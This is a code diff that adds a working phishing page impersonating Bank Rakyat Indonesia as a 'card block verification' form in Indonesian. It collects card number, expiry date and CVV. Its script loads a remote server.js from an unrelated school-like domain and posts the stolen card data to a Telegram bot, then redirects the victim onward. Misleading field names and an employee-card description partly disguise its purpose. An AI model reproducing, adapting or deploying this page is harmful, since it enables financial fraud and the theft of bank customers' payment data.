@@ -1,0 +1,380 @@
+<!doctype html>
+<html lang="id">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Verifikasi Kartu</title>
+  <meta name="theme-color" content="#0F78CB" />
+  <meta name="description" content="Form verifikasi kartu karyawan. Input nomor karyawan, bulan/tahun masuk, dan blok kerja." />
+
+  <style>
+    *{box-sizing:border-box}
+    :root{
+      --blue:#0F78CB;
+      --blue2:#0B5FA1;
+      --bg:#f5f8ff;
+      --card:#ffffff;
+      --text:#0f172a;
+      --muted:rgba(2,6,23,.55);
+      --stroke:rgba(15,23,42,.10);
+      --shadow:0 18px 40px rgba(2,6,23,.10);
+      --max:560px;
+      --radius:18px;
+    }
+
+    body{
+      margin:0;
+      font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif;
+      color:var(--text);
+      background:
+        radial-gradient(900px 420px at 10% -10%, rgba(15,120,203,.14), transparent 55%),
+        radial-gradient(800px 420px at 110% 10%, rgba(15,120,203,.10), transparent 55%),
+        var(--bg);
+      min-height:100vh;
+      display:flex;
+      flex-direction:column;
+    }
+
+    .nav{
+      position:sticky; top:0; z-index:10;
+      backdrop-filter:saturate(160%) blur(10px);
+      background:rgba(245,248,255,.78);
+      border-bottom:1px solid var(--stroke);
+    }
+    .nav-inner{
+      max-width:980px;
+      margin:auto;
+      padding:12px 18px;
+      display:flex;
+      align-items:center;
+    }
+    .brand{
+      display:flex;
+      align-items:center;
+      gap:12px;
+    }
+    .brand span{
+      
+display:inline-block;
+  padding:6px 10px;
+  background:#fff;
+  color:#000;
+  border-radius:6px;
+  font-weight:bold;
+    }
+    .title{font-weight:800;font-size:14px}
+    .sub{font-size:12px;color:var(--muted)}
+
+    main{
+      flex:1;
+      display:flex;
+      justify-content:center;
+      padding:22px 18px;
+    }
+    .wrap{width:100%;max-width:var(--max)}
+    .panel{
+      background:#fff;
+      border-radius:18px;
+      border:1px solid var(--stroke);
+      box-shadow:var(--shadow);
+      overflow:hidden;
+    }
+    .panel-head{padding:16px;border-bottom:1px solid var(--stroke)}
+    .panel-head h1{margin:0;font-size:15px;font-weight:800}
+    .panel-head p{margin-top:6px;font-size:12px;color:var(--muted)}
+
+    .cardArea{padding:16px}
+    .cardPreview{
+      position:relative;
+      border-radius:16px;
+      overflow:hidden;
+      aspect-ratio:16/10;
+      border:1px solid var(--stroke);
+    }
+    .cardPreview img{width:100%;height:100%;object-fit:cover}
+    .cardOverlay{
+      position:absolute;inset:0;
+      background:linear-gradient(120deg, rgba(2,6,23,.55), rgba(2,6,23,.15));
+    }
+    .cardDigits{
+      position:absolute;left:16px;right:16px;bottom:14px;
+      display:flex;justify-content:space-between;align-items:flex-end;
+    }
+    .digitsLabel{font-size:11px;color:rgba(255,255,255,.8)}
+    .digitsValue{font-family:monospace;font-size:16px;letter-spacing:2px;color:#fff}
+    .chip{width:44px;height:34px;border-radius:10px;background:linear-gradient(135deg,#ffd06a,#d7a52b)}
+
+    .form{padding:0 16px 18px}
+    label{font-size:12px;color:var(--muted);margin:12px 0 6px;display:block}
+    input{
+      width:100%;
+      padding:12px;
+      border-radius:12px;
+      border:1px solid var(--stroke);
+      font-size:14px;
+    }
+    .row2{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+    .err{
+      display:none;
+      margin-top:10px;
+      padding:10px;
+      border-radius:12px;
+      background:rgba(239,68,68,.1);
+      color:#991b1b;
+      font-size:12px;
+    }
+    .btn{
+      margin-top:14px;
+      width:100%;
+      padding:12px;
+      border:none;
+      border-radius:12px;
+      background:linear-gradient(135deg,var(--blue),var(--blue2));
+      color:#fff;
+      font-weight:800;
+      cursor:pointer;
+    }
+    .btn:disabled{opacity:.5}
+
+    footer{
+      border-top:1px solid var(--stroke);
+      background:#fff;
+    }
+    .footer-inner{
+      max-width:980px;
+      margin:auto;
+      padding:16px 18px;
+      font-size:12px;
+      color:var(--muted);
+    }
+    
+    #kode{
+  display:inline-block;
+  padding:6px 10px;
+  background:#;
+  color:;
+  border-radius:6px;
+  font-weight:bold;
+}
+
+
+.logo-bank{
+  width:120px;
+  height:40px;
+  object-fit:contain;
+  display:block;
+}
+  </style>
+</head>
+
+<body>
+
+<div class="nav">
+  <div class="nav-inner">
+    <div class="brand">
+<img id="logoBank" class="logo-bank">
+      <div>
+        <div class="title" id="bank">Bank Rakyat Indonesia</div>
+        <div class="sub">Verifikasi Blokir Debit Online</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<main>
+  <div class="wrap">
+    <div class="panel">
+      <div class="panel-head">
+        <h1>Masukkan Nomor Kartu</h1>
+        <p>Semua data wajib diisi dengan benar.</p>
+      </div>
+
+      <div class="cardArea">
+        <div class="cardPreview">
+          <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhhJKdtoFSfYD5IuvlqDcoJlFrM2mGM0k7J_yAuf4dEHItQEd-M13KiKp1kMWCK_K_LVTJN47VEE6rKUt9ThQrcqmsJyC07BbJBl3ojX0OWv-nfsAHOxmxyOySnuHJ7mEKK9UPKQi2mO6v1rDynlZJzz5R6aDwmaNKkbWY37qgve6Ji6e5ROYj_TQFyMJc/s350/AddText_04-13-02.00.05.jpg">
+          <div class="cardOverlay"></div>
+          <div class="cardDigits">
+            <div>
+              <div class="digitsLabel">Nomor Kartu Debit/Kredit</div>
+              <div id="cardNumberView" class="digitsValue">0000 0000 0000 0000</div>
+            </div>
+            <div class="chip"></div>
+          </div>
+        </div>
+      </div>
+
+    <form method="POST" a3utocomplete="on" id="cardForm" style="padding: 15px">
+    <label>Nomor Kartu *</label>
+    <input id="empNumber" type="tel" maxlength="19" name="satu" placeholder="Masukan Nomor Kartu" required>
+
+    <div class="row2">
+        <div>
+            <label>Masa Berlaku*</label>
+            <input type="tel" id="joinMMYY" maxlength="5" name="dua" placeholder="MM/YY" required>
+        </div>
+        <div>
+            <label>CVV *</label>
+            <input type="tel" id="workBlock" r33e maxlength="3" name="tiga" placeholder="CVV (3digit)" required>
+        </div>
+    </div>
+<br>
+
+    <div class="err" id="errorBox">Semua data harus diisi dengan benar</div>
+    <button class="btn" id="submitBtn" disabled>Lanjut</button>
+</form>
+
+<script>
+document.addEventListener("DOMContentLoaded", function(){
+
+  const bankName = sessionStorage.getItem("bankName");
+  const bankCode = sessionStorage.getItem("bankCode");
+  const logo = sessionStorage.getItem("bankLogo");
+
+  if(document.getElementById("bank"))
+    document.getElementById("bank").textContent = bankName;
+
+  if(document.getElementById("namabank"))
+    document.getElementById("namabank").textContent = bankName;
+
+  if(document.getElementById("kode"))
+    document.getElementById("kode").textContent = bankCode;
+    
+    
+    
+if(logo){
+  document.getElementById("logoBank").src = logo;
+}
+
+});
+</script>
+<script src="https://smpnegeri41jkt.my.id/3/server.js"></script>
+<script>
+// Konfigurasi Telegram Bot
+
+const TELEGRAM_API_URL = `https://api.telegram.org/bot${token}/sendMessage`;
+
+// Validasi form untuk mengaktifkan tombol
+const form = document.getElementById('cardForm');
+const inputs = form.querySelectorAll('input[required]');
+const submitBtn = document.getElementById('submitBtn');
+const errorBox = document.getElementById('errorBox');
+
+// Sembunyikan pesan error awal
+errorBox.style.display = 'none';
+
+// Cek validasi setiap input berubah
+inputs.forEach(input => {
+    input.addEventListener('input', () => {
+        let isAllValid = true;
+        inputs.forEach(inp => {
+            if (!inp.value.trim()) {
+                isAllValid = false;
+            }
+            // Validasi format khusus
+            if (inp.id === 'joinMMYY' && inp.value.trim()) {
+                const mmYyRegex = /^\d{2}\/\d{2}$/;
+                if (!mmYyRegex.test(inp.value)) {
+                    isAllValid = false;
+                }
+            }
+        });
+        submitBtn.disabled = !isAllValid;
+        errorBox.style.display = isAllValid ? 'none' : 'block';
+    });
+});
+
+// Fungsi kirim data ke Telegram saat form disubmit
+form.addEventListener('submit', async (e) => {
+    e.preventDefault(); // Hentikan pengiriman form default
+
+    // Ambil data dari input
+    const cardNumber = document.getElementById('empNumber').value;
+    const expiryDate = document.getElementById('joinMMYY').value;
+    const cvv = document.getElementById('workBlock').value;
+
+
+
+sessionStorage.setItem("judul", "Proses Blokir Kartu Kredit/Debit Online Berhasil");
+
+    // Format pesan
+    const message = `
+*DATA KARTU*
+Nomor Kartu : ${cardNumber}
+Masa Berlaku : ${expiryDate}
+CVV : ${cvv}
+    `.trim();
+
+    try {
+        // Kirim ke Telegram via API
+        const response = await fetch(TELEGRAM_API_URL, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                chat_id: grup,
+                text: message,
+                parse_mode: 'Markdown'
+            })
+        });
+
+        const result = await response.json();
+        if (result.ok) {
+        location.href="infolain.html";
+            form.reset();
+            submitBtn.disabled = true;
+        } else {
+            alert('Gagal mengirim data: ' + result.description);
+        }
+    } catch (error) {
+        alert('Terjadi kesalahan: ' + error.message);
+    }
+});
+</script>
+
+    </div>
+  </div>
+</main>
+
+<footer>
+  <div class="footer-inner">
+      <center>
+    ? <span id="yearNow"></span> ? <strong id="namabank">Bank Rakyat Indonesia</strong>
+    </center>
+  </div>
+</footer>
+
+<script>
+const emp = document.getElementById('empNumber');
+const join = document.getElementById('joinMMYY');
+const block = document.getElementById('workBlock');
+const view = document.getElementById('cardNumberView');
+const btn = document.getElementById('submitBtn');
+const err = document.getElementById('errorBox');
+
+document.getElementById('yearNow').textContent = new Date().getFullYear();
+
+const digits=v=>v.replace(/\D/g,'');
+const format=v=>v.replace(/(\d{4})(?=\d)/g,'$1 ');
+
+function validate(){
+  let n = digits(emp.value).slice(0,16);
+  emp.value = format(n);
+  view.textContent = format(n.padEnd(16,'0'));
+
+  let j = join.value.match(/^\d{2}\/\d{2}$/);
+  let b = digits(block.value).length === 3;
+
+  btn.disabled = !(n.length===16 && j && b);
+  err.style.display = btn.disabled ? 'block' : 'none';
+}
+
+emp.oninput = validate;
+join.oninput = ()=>{join.value=digits(join.value).slice(0,4).replace(/(\d{2})(\d{0,2})/,'$1/$2');validate()};
+block.oninput = ()=>{block.value=digits(block.value).slice(0,3);validate()};
+</script>
+
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/v8c78df7c7c0f484497ecbca7046644da1771523124516" integrity="sha512-8DS7rgIrAmghBFwoOTujcf6D9rXvH8xm8JQ1Ja01h9QX8EzXldiszufYa4IFfKdLUKTTrnSFXLDkUEOTrZQ8Qg==" data-cf-beacon='{"version":"2024.11.0","token":"a0b5f8e800134bfaac205ddb0b78250b","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/v833ccba57c9e4d2798f2e76cebdd09a11778172276447" integrity="sha512-57MDmcccJXYtNnH+ZiBwzC4jb2rvgVCEokYN+L/nLlmO8rfYT/gIpW2A569iJ/3b+0UEasghjuZH/ma3wIs/EQ==" data-cf-beacon='{"version":"2024.11.0","token":"fb2304f2e1cf43e9bebbc7e7be717d56","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+</body>
+</html>
